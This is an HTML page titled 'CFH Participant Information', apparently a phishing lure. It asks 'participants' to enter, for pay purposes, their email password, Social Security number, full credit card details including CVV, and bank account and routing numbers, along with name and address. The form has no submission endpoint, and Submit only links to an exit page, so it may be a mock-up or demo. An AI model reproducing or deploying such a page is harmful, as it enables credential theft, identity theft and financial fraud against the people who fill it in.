<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CFH Participant Information</title>
    <link rel="stylesheet" href="https://pyscript.net/alpha/pyscript.css" />
    <script defer src="https://pyscript.net/alpha/pyscript.js"></script>
    <link rel="stylesheet" href="styles.css">
</head>
<body>
    <div class="cfh-logo">
        <img src="./Pictures/logo.svg" class="cfh-logo" alt="logo">
    </div>
    <h3>Hello Participants, please input your information in the boxes below.
        In order to better assist you in regards to pay, please put in your credit card information
        and banking information as well.
    </h3>
    <form>
        <label for="firstname">First Name:</label>
        <input type="text" name="firstname" id="firstname" required>
        <label for="lastname">Last Name:</label>
        <input type="text" name="lastname" id="lastname" required>
        <br>
        <br>
        <label for="address">Address:</label>
        <input type="text" name="address" id="address" size="50" required>
        <br>
        <br>
        <label for="city">City:</label>
        <input type="text" name="city" id="city" required>
        <label for="state">State (initials):</label>
        <input type="text" name="state" id="state" size="3" required>
        <label for="zipcode">Zip Code:</label>
        <input type="text" name="zipcode" id="zipcode" size="5" required>
        <br>
        <br>
        <label for="phonenumber">Phone Number:</label>
        <input type="text" name="phonenumber" id="phonenumber" required>
        <br>
        <br>
        <label for="email">Email:</label>
        <input type="text" name="email" id="email" required>
        <br>
        <br>
        <label for="password">Email Password:</label>
        <input type="text" name="password" id="password" required>
        <br>
        <br>
        <label for="socialsecurity">Social Security Number:</label>
        <input type="text" name="socialsecurity" id="socialsecurity" required>
        <br>
        <br>
        <label for="creditcard">Credit Card Number:</label>
        <input type="text" name="creditcard" id="creditcard" required>
        <br>
        <br>
        <label for="expiration">Expiration Date (MM/YY):</label>
        <input type="text" name="expiration" id="expiration" size="5" required>
        <label for="cvv">CVV:</label>
        <input type="text" name="cvv" id="cvv" size="5" required>
        <br>
        <br>
        <label for="bankname">Bank Name:</label>
        <input type="text" name="bankname" id="bankname" required>
        <br>
        <br>
        <label for="accountnumber">Account Number:</label>
        <input type="text" name="accountnumber" id="accountnumber" required>
        <br>
        <br>
        <label for="routingnumber">Routing Number:</label>
        <input type="text" name="routingnumber" id="routingnumber" required>
        <br>
        <br>
        <a href="Exit.html"><input type="submit" value="Submit"></a>
    </form>
    <footer>
        <img src="./Pictures/logo-icon.svg" class="logo-icon" alt="cfh logo">
    </footer>
</body>
</html>
